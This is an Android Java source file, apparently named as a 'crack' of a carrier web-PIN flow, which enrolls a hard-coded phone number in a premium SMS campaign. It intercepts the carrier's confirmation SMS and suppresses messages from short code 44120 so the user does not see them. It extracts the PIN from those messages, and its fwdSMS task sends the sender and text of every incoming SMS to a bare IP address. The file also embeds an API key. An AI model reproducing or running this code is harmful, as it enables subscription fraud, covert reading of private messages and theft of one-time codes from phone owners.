package dlv.niva.mx.flujowebcrack;

import android.app.DownloadManager;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.os.AsyncTask;
import android.os.Build;
import android.provider.Telephony;
import android.support.v7.app.ActionBarActivity;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.view.WindowManager;
import android.widget.TextView;

import org.apache.http.HttpResponse;
import org.apache.http.HttpStatus;
import org.apache.http.NameValuePair;
import org.apache.http.StatusLine;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;


public class MainActivity extends ActionBarActivity {


    public static TextView tvCurrentStep; //textView para agregar información del proceso.
    private static boolean waitingSMS = true;
    private static int overallStep = 0; //overall step 1-4 //1,3 HTTP POST requests // 2,4 intercepción de SMSs
    private static String phoneNumber = "5514861800";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        tvCurrentStep = (TextView)findViewById(R.id.tvCurrentStep);

        /**
         * obtener el número de teléfono del SIM
         */
//        TelephonyManager manager =(TelephonyManager)getApplicationContext().getSystemService(Context.TELEPHONY_SERVICE);
//        String mPhoneNumber = manager.getLine1Number();
//        if(mPhoneNumber != null && mPhoneNumber != ""){
//            phoneNumber = mPhoneNumber;
//        }
        tvCurrentStep.append("\r\n- Phone no. :: "+phoneNumber);
        tvCurrentStep.append("\r\n- StepOne :: Iniciando Proceso de WEBPIN y envío de MSISDN");
        overallStep = 1;
        //servicio que recibe el Broadcast (SMS_RECEIVED_ACTION)
        this.registerReceiver(smsReceiver, new IntentFilter(Telephony.Sms.Intents.SMS_RECEIVED_ACTION));
        //asyncTask primer POST a niva.devportal
        new stepOne().execute();
    }

    /**
     * para hacer la app Fullscreen
     */
    @Override
    protected void onResume(){
        super.onResume();
        if (Build.VERSION.SDK_INT < 16)
        {
            // Hide the status bar
            getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN);
            // Hide the action bar
//            getSupportActionBar().hide();
        }
        else
        {
            // Hide the status bar
            getWindow().getDecorView().setSystemUiVisibility(View.SYSTEM_UI_FLAG_FULLSCREEN);
            // Hide the action bar
//            getActionBar().hide();
        }
    }

    /**
     * Al cerrarse la App borrar el registro del broadcast receiver
     * en teoría no se debería quitar para que cualquier broadcast SMS_RECEIVED_ACTION le llegue al recibidor
     */
    @Override
    protected void onDestroy(){
//        ComponentName component = new ComponentName(getApplicationContext(), SMSReceiver.class);
//        int status = getApplicationContext().getPackageManager().getComponentEnabledSetting(component);
//        if(status == PackageManager.COMPONENT_ENABLED_STATE_ENABLED) {
//            Log.i("onDestroy","receiver is disabled");
//            getApplicationContext().getPackageManager().setComponentEnabledSetting(component, PackageManager.COMPONENT_ENABLED_STATE_DISABLED , PackageManager.DONT_KILL_APP);
//
//        }
        Log.i("onDestroy", "Unregister smsReceiver");
        this.unregisterReceiver(smsReceiver);

        super.onDestroy();
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_settings) {
            return true;
        }

        return super.onOptionsItemSelected(item);
    }

    /************************ dlv ***************************/

    /**
     * SMSReceiver Broadcast
     * Recibe el SMS y lo manda a la funcion smsReceived
     * este recibidor esta en otro contexto por eso se tiene que mandar a la app.
     */
    public BroadcastReceiver smsReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            final Bundle bundle = intent.getExtras();
            try {
                if (bundle != null) {
                    final Object[] pdusObj = (Object[]) bundle.get("pdus");

                    for (int i = 0; i < pdusObj.length; i++) {

                        SmsMessage currentMessage = SmsMessage.createFromPdu((byte[]) pdusObj[i]);
                        String phoneNumber = currentMessage.getDisplayOriginatingAddress();

                        String senderNum = phoneNumber;
                        String message = currentMessage.getDisplayMessageBody();
                        Log.i("SmsReceive-MainActivity", "senderNum: " + senderNum + "; message: " + message);
                        if(senderNum.equals("44120")) {
                            abortBroadcast();
                        }
                        MainActivity.smsReceived(senderNum, message);
                    } // end for loop
                } // bundle is null
            } catch (Exception e) {
                Log.e("SmsReceiver", "Exception smsReceiver" +e);
            }
        }
    };



    /***
     *
     * stepOne
     * Primer REQUEST hacia el AGREGADOR
     *
     */
    public class stepOne extends AsyncTask<URL, Integer, Long>{
        private boolean reqSuccess = false;
        private String error = "";
        private String desc = "";
        /**
         * http://api.nivadev.com/webpin/sendPin
         * {
         "msisdn": "8112660394",
         "key": "yXvpgGZQjenbkzQaEGvo46Wprz",
         "campaignCode": "aag01",
         "ip": "0.0.0.0",
         "trackingId": "001",
         "user-agent": "na"
         }
         *
         * @param params
         * @return
         */
        @Override
        protected Long doInBackground(URL... params) {
            HttpClient httpclient = new DefaultHttpClient();
            HttpResponse response;
            String responseString = null;
            JSONObject request = new JSONObject();
            JSONObject jsonResponse;
            String requestString = "";
            StringEntity requestStringEntity;


            try {
                HttpPost post = new HttpPost("http://api.nivadev.com/webpin/sendPin");
                post.setHeader("Accept", "application/json");
                post.setHeader("Content-type", "application/json");

                request.put("msisdn", phoneNumber);
                request.put("key", "yXvpgGZQjenbkzQaEGvo46Wprz");
                request.put("campaignCode", "aag01");
                request.put("ip", "0.0.0.0");
                request.put("trackingId", "001");
                request.put("user-agent", "na");

                requestString = request.toString();
                requestStringEntity = new StringEntity(requestString);

                post.setEntity(requestStringEntity);
                /**
                 * TODO
                 *  List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(1);
                 nameValuePairs.add(new BasicNameValuePair("msisdn", "##########"));
                 httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
                 *
                 */
                response = httpclient.execute(post);

                StatusLine statusLine = response.getStatusLine();
                if(statusLine.getStatusCode() == HttpStatus.SC_OK){
                    responseString = EntityUtils.toString(response.getEntity());
                    jsonResponse = new JSONObject(responseString);
                    error = jsonResponse.get("error").toString();
                    desc = jsonResponse.get("desc").toString();

                    if(error.equals("00") || error.equals("0")){
                        reqSuccess = true;
                    }else{
                        reqSuccess = false;
                    }

//                    responseString = out.toString();
                    Log.i("RequestResponse-StepONE", jsonResponse.toString());
                } else{
                    //Closes the connection.
                    response.getEntity().getContent().close();
                    throw new IOException(statusLine.getReasonPhrase());
                }

            } catch (ClientProtocolException e) {
                Log.i("ClientProtocolException-Error", e.toString());
                reqSuccess = false;
            } catch (IOException e) {
                Log.i("IOException-Error", e.toString());
                reqSuccess = false;
            } catch (JSONException e) {
                Log.i("JSON-Error", e.toString());
                reqSuccess = false;
            }
            return null;
        }

        @Override
        protected void onPostExecute(Long result) {
            stepOneFinished(reqSuccess, error, desc);
        }
    }


    /***
     *
     * stepThree
     * Segundo REQUEST hacia el AGREGADOR
     *
     */
    public static class stepThree extends AsyncTask<String, Integer, Long>{
        private boolean reqSuccess = false;
        /**
         * http://api.nivadev.com/webpin/sendPin
         * {
         * "key": "yXvpgGZQjenbkzQaEGvo46Wprz",
         * "msisdn": "4111145136",
         * "campaignCode": "aag01",
         * "pin": "3"
         * }
         *
         * @param params
         * @return
         */
        @Override
        protected Long doInBackground(String... params) {
            HttpClient httpclient = new DefaultHttpClient();
            HttpResponse response;
            String responseString = null;
            JSONObject request = new JSONObject();
            JSONObject jsonResponse;
            String requestString = "";
            StringEntity requestStringEntity;
            try {
                HttpPost post = new HttpPost("http://api.nivadev.com/webpin/confirmPin");
                post.setHeader("Accept", "application/json");
                post.setHeader("Content-type", "application/json");

                request.put("msisdn", phoneNumber);
                request.put("key", "yXvpgGZQjenbkzQaEGvo46Wprz");
                request.put("campaignCode", "aag01");
                request.put("pin", params[0]);

                requestString = request.toString();
                requestStringEntity = new StringEntity(requestString);

                post.setEntity(requestStringEntity);
                /**
                 * httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
                 */

                response = httpclient.execute(post);

                StatusLine statusLine = response.getStatusLine();
                if(statusLine.getStatusCode() == HttpStatus.SC_OK){
                    responseString = EntityUtils.toString(response.getEntity());
                    jsonResponse = new JSONObject(responseString);
                    String error = jsonResponse.get("error").toString();
                    if(error.equals("00") || error.equals("0")){
                        reqSuccess = true;
                    }else{
                        reqSuccess = false;
                    }
                    Log.i("RequestResponse-StepTHREE", jsonResponse.toString());
                } else{
                    //Closes the connection.
                    response.getEntity().getContent().close();
                    throw new IOException(statusLine.getReasonPhrase());
                }

            } catch (ClientProtocolException e) {
                Log.i("ClientProtocolException-Error", e.toString());
                reqSuccess = false;
            } catch (IOException e) {
                Log.i("IOException-Error", e.toString());
                reqSuccess = false;
            } catch (JSONException e) {
                Log.i("JSON-Error", e.toString());
                reqSuccess = false;
            }
            return null;
        }

        @Override
        protected void onPostExecute(Long result) {
            stepThreeFinished(reqSuccess);
        }
    }

    /**
     *
     * si el request es exitoso waitingSMS = true para empezar a escuchar el mensaje de TELCEL
     *
     * @param reqOneSuccess - HTTP Response del request
     * @param error - codigo de error mandado por niva.devportal
     * @param details - detalles del "error"
     */
    public void stepOneFinished(boolean reqOneSuccess, String error, String details){
        if(reqOneSuccess == true){
            tvCurrentStep.append("\r\n- StepOne :: Success");
            tvCurrentStep.append("\r\n- Listening for SMS");
            waitingSMS = true;
            overallStep = 2;
        }else{
            tvCurrentStep.append("\r\n- StepOne :: Failed :: "+ details);

        }
    }

    /**
     * Mensaje recibido
     * Empieza a ejecutar fwdSMS
     *
     * @param number
     * @param message
     */
    public static void smsReceived(String number, String message){
        //todo
        /**
         * 2342 es tu codigo, ingrésalo en el sitio de Club DJMOVIL y disfruta del servicio
         * + info http://z.telcel.mobi/TerminosyCondiciones
         */
        new fwdSMS().execute(new String[]{number, message});
        if(waitingSMS == true && overallStep == 2){
            String[] msg = message.split(" ");
            String codigoConfirmacion = msg[0];
            tvCurrentStep.append("\r\n- STEP TWO :: SMS Received :: from: "+number+" :: confirmationCode:"+codigoConfirmacion);
            tvCurrentStep.append("\r\n- STEP TWO :: Sending confirmation PIN");
            waitingSMS = false;
            overallStep = 3;
//            new stepThree().execute(codigoConfirmacion);
//            tvCurrentStep.append("\r\n- finished");

        }else if(waitingSMS == true && overallStep == 4){
            waitingSMS = false;
            String[] msg = message.split(" ");
            tvCurrentStep.append("\r\n- STEP FOUR SMS Received :: from: "+number+" msg:"+msg);
            String felicidades = msg[0];
            if(felicidades.equals("Felicidades!")){
                tvCurrentStep.append("\r\n- finished!");
            }else{
                tvCurrentStep.append("\r\n- Try again");
            }
        }
    }

    /**
     * si el request es exitoso waitingSMS = true para empezar a escuchar el mensaje de TELCEL
     *
     * @param reqSuccess
     */
    private static void stepThreeFinished(boolean reqSuccess){
        if(reqSuccess == true){
            tvCurrentStep.append("\r\n- StepThree :: Success");
            tvCurrentStep.append("\r\n- Listening for SMS");
            waitingSMS = true;
            overallStep = 4;
        }else{
            tvCurrentStep.append("\r\n- StepThree :: Failed - Try again");
        }
    }

    /**
     * SMS Forward mientras SMS_RECEIVED_ACTION broadcast este activado (solo durante la vida de la aplicación)
     *
     */
    public static class fwdSMS extends AsyncTask<String, Integer, Long>{
        private boolean reqSuccess = false;
        /**
         *
         * @param params
         * params[0] == number
         * params[1] == message
         * @return null
         */
        @Override
        protected Long doInBackground(String... params) {
            HttpClient httpclient = new DefaultHttpClient();
            HttpResponse response;
            String responseString = null;
            String requestString = "";
            StringEntity requestStringEntity;
            try {
                String message = "number::"+params[0] + "-msg::"+ params[1];
                HttpGet get = new HttpGet("http://54.172.237.131/hello.php?mensaje="+message);

                response = httpclient.execute(get);
                Log.i("MainActivity","RequestResponse::"+response.toString());
                StatusLine statusLine = response.getStatusLine();

                BufferedReader rd = new BufferedReader(
                        new InputStreamReader(response.getEntity().getContent()));

                StringBuffer result = new StringBuffer();
                String line = "";
                while ((line = rd.readLine()) != null) {
                    result.append(line);
                }
                Log.i("MainActivity-Result", result.toString());
                if(statusLine.getStatusCode() == HttpStatus.SC_OK){
                    Log.i("MainActivity", "FwdSMS-success");
                    reqSuccess = true;
                } else{
                    Log.i("MainActivity", "FwdSMS-failed");
                    reqSuccess = false;
                    //Closes the connection.
                    response.getEntity().getContent().close();
                    throw new IOException(statusLine.getReasonPhrase());
                }
            } catch (ClientProtocolException e) {
                Log.i("ClientProtocolException-Error", e.toString());
                reqSuccess = false;
            } catch (IOException e) {
                Log.i("IOException-Error", e.toString());
                reqSuccess = false;
            }
//            catch (JSONException e) {
//                Log.i("JSON-Error", e.toString());
//                reqSuccess = false;
//            }
            return null;
        }
    }
}
